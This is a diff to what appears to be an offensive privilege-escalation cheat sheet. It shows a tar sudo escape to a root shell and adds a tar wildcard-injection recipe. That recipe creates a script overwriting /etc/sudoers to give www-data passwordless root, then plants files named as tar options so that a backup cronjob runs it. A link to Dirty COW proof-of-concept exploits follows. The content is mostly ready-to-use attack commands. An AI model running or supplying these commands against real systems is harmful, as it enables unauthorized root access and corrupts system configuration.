@@ -454,6 +454,15 @@ If you want to exucute code with a tar command (e.g. backup cronjob) , rename fi
 OR
 `> sudo tar -cf /dev/null /dev/null --checkpoint=1 --checkpoint-action=exec=/bin/sh`
 
+OR
+In the backuped DIR:
+
+`echo 'echo "www-data ALL=(root) NOPASSWD: ALL" > /etc/sudoers' > privesc.sh`
+
+`echo "/var/www/html"  > "--checkpoint-action=exec=sh privesc.sh"`
+
+`echo "/var/www/html"  > --checkpoint=1`
+
 #### dirty cOw privilege escalation
 https://github.com/dirtycow/dirtycow.github.io/wiki/PoCs
 
